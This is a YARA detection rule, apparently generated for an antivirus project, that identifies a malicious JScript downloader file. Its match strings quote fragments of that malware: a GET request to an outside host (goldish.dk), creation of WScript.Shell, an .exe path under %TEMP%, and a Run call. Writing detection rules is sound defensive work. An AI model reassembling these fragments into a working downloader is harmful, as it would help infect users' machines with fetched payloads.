rule sig_20160330_9e0ec8c0a89841a2b0c1a1e123c4ff29 {
  meta:
    description = "datamaliciousorder - file 20160330_9e0ec8c0a89841a2b0c1a1e123c4ff29.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dbae640cf524597d2e8a631875ef281e7dea6dceadc96945358b4a847f5f67c7"

  strings:
    $s1  = "function _VF(_C, _Q1){_FI = _FI * 1; return _C - _Q1;};" fullword ascii
    $s2  = "_O[_UU](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s3  = "var _P = function _E() {return WScript[_Q](\"WScript\"+\".Shell\");}(), _I = 11;" fullword ascii
    $s4  = "if (_O[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _Z0(){return _IX + \"\";};" fullword ascii
    $s6  = "function _Z() {return _P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HetXFiU8KXbqxgGq.ex\" + \"e\";};" fullword ascii
    $s7  = "function _G() {return ((_H == true) && (_H == _D0)) ? 1 : _FI;};" fullword ascii
    $s8  = "function _JF(_QU){_P[\"Run\"](_QU, _FI, _FI);};" fullword ascii
    $s9  = "function _R()" fullword ascii
    $s10 = "function _B(){return 22;};" fullword ascii
    $s11 = " while (_ZH){" fullword ascii
    $s12 = "function _A(_EV) {var _F = (1, 2, 3, 4, 5, _EV); return _F;};" fullword ascii
    $s13 = "return _VF(_XD, _T);" fullword ascii
    $s14 = "var _A1 = new this[\"Date\"]();" fullword ascii
    $s15 = "function _XN(){return _Q;};" fullword ascii
    $s16 = "var _D0 = false;" fullword ascii
    $s17 = "_D0 = true; " fullword ascii
    $s18 = "var _Y = false;" fullword ascii
    $s19 = "var _H = false;" fullword ascii
    $s20 = "_H = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}